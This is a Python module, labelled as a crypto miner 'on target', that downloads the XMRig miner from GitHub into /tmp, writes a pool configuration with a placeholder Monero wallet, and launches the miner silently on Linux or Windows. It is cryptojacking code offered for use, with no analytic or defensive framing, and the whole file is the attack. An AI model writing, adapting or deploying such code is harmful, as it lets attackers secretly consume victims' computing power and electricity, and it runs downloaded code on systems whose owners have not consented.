#!/usr/bin/env python3
# CRYPTO MINER MODULE - Mine cryptocurrency on target
import os
import sys
import subprocess
import platform
import time

class CryptoMiner:
    def __init__(self, wallet_address=None, pool_url=None):
        self.wallet = wallet_address or "49r7pY5sKqZQpQxQxQxQxQxQxQxQxQxQxQxQxQxQ"
        self.pool = pool_url or "pool.supportxmr.com:3333"
        self.system = platform.system()
        
    def download_xmrig(self):
        """Download XMRig miner"""
        if self.system == "Linux":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
            filename = "/tmp/xmrig.tar.gz"
        elif self.system == "Windows":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
            filename = "/tmp/xmrig.zip"
        else:
            return None
        
        try:
            import requests
            response = requests.get(url, stream=True)
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            if self.system == "Linux":
                os.system(f"tar -xzf {filename} -C /tmp/")
                return "/tmp/xmrig-6.21.0/xmrig"
            else:
                import zipfile
                with zipfile.ZipFile(filename, 'r') as zip_ref:
                    zip_ref.extractall("/tmp/")
                return "/tmp/xmrig-6.21.0/xmrig.exe"
        except:
            return None
    
    def start_mining(self):
        """Start mining process"""
        miner_path = self.download_xmrig()
        if not miner_path:
            return None
        
        config = {
            "autosave": True,
            "cpu": {"enabled": True, "max-threads-hint": 75},
            "pools": [{"url": self.pool, "user": self.wallet, "pass": "x", "tls": False}]
        }
        
        config_file = "/tmp/config.json"
        import json
        with open(config_file, 'w') as f:
            json.dump(config, f)
        
        try:
            process = subprocess.Popen([miner_path, "-c", config_file], 
                                      stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL)
            return process
        except:
            return None
    
    def mine_background(self, duration=None):
        """Mine in background"""
        process = self.start_mining()
        if process:
            print(f"[+] Mining started with wallet: {self.wallet}")
            if duration:
                time.sleep(duration)
                process.terminate()
                print("[+] Mining stopped")
            return process
        return None
